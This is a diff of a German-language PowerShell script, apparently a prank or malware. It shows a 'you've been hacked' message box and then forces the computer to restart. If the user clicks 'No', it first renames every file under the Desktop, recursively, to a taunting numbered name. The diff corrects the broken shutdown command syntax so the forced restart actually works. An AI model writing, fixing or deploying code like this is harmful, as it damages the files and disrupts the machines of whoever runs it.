@@ -6,7 +6,7 @@ $Result = [System.Windows.MessageBox]::Show('Du wurdest gehackt! Willst du jetzt
 switch($Result){
     'Yes'{
         "Yes" | Out-File -FilePath \Documents\SEXWARE\YesNo.txt
-        shutdown - r-t 10 -c '*Böse Lache* Hahahhaha'
+        shutdown -r -t 10 -c '*Böse Lache* Hahahhaha'
     }
     'No'{
         cd Desktop
@@ -14,6 +14,6 @@ switch($Result){
         Get-ChildItem -Recurse | ForEach-Object {
             $_ | Rename-Item -NewName "DU ENTKOMMST MIR NICHT $(($counter++))$($_.Extension)"
         }
-        shutdown - r-t 10 -c 'Hahaha das ist mir sowasvon egal, wird jetzt trotzdem neugestartet :)'
+        shutdown -r -t 10 -c 'Hahaha das ist mir sowasvon egal, wird jetzt trotzdem neugestartet :)'
         }
 }
